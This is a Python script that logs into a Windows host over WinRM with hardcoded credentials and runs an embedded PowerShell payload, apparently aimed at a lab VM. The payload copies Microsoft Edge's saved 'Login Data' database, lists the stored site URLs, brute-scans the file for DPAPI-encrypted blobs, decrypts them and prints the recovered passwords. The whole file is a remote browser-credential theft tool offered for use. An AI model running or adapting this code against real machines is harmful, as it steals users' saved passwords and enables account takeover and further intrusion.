#!/usr/bin/env python3
"""
Compact Browser Credential Extraction via WinRM
"""

import winrm

# Compact PowerShell script for credential extraction
script = r"""
Add-Type -AssemblyName System.Security
$edge = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$temp = "$env:TEMP\e$(Get-Random).db"

Write-Host "`n=== EDGE CREDENTIAL EXTRACTION ===" -ForegroundColor Cyan

if (Test-Path $edge) {
    Copy-Item $edge $temp -Force
    $bytes = [IO.File]::ReadAllBytes($temp)
    $text = [Text.Encoding]::UTF8.GetString($bytes)
    
    $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}') | 
            Select -Expand Value -Unique | Select -First 10
    
    Write-Host "[+] Found $($urls.Count) credential entries:" -ForegroundColor Green
    $i=1
    foreach ($u in $urls) { Write-Host "  [$i] $u" -ForegroundColor Yellow; $i++ }
    
    Write-Host "`n[*] Attempting DPAPI decryption..." -ForegroundColor Cyan
    $found=0
    for ($j=0; $j -lt $bytes.Length-100; $j++) {
        if ($bytes[$j] -eq 1 -and $bytes[$j+1] -eq 0 -and $bytes[$j+2] -eq 0 -and $bytes[$j+3] -eq 0) {
            try {
                $blob = $bytes[$j..($j+255)]
                $dec = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'CurrentUser')
                $pwd = [Text.Encoding]::UTF8.GetString($dec)
                if ($pwd.Length -gt 0 -and $pwd.Length -lt 100) {
                    $found++
                    Write-Host "  [*] Password $found`: " -NoNewline -ForegroundColor Gray
                    Write-Host "$pwd" -ForegroundColor Red
                    if ($found -ge 5) { break }
                }
            } catch {}
        }
    }
    
    if ($found -eq 0) {
        Write-Host "  [!] No passwords decrypted (may need SQLite module)" -ForegroundColor Yellow
    } else {
        Write-Host "`n[+] Decrypted $found passwords!" -ForegroundColor Green
    }
    
    Remove-Item $temp -Force -EA SilentlyContinue
} else {
    Write-Host "[-] Edge database not found" -ForegroundColor Red
}

Write-Host "`n[*] Extraction complete!`n" -ForegroundColor Cyan
"""

print("[*] Connecting to Windows VM...")
session = winrm.Session('http://192.168.56.102:5985/wsman', auth=('akila', '12345678'), transport='ntlm')

print("[+] Connected! Executing credential extraction...")
print("="*70)

result = session.run_ps(script)

if result.status_code == 0:
    print(result.std_out.decode())
else:
    print("ERROR:")
    print(result.std_err.decode())

print("="*70)
print(f"[*] Exit Code: {result.status_code}\n")
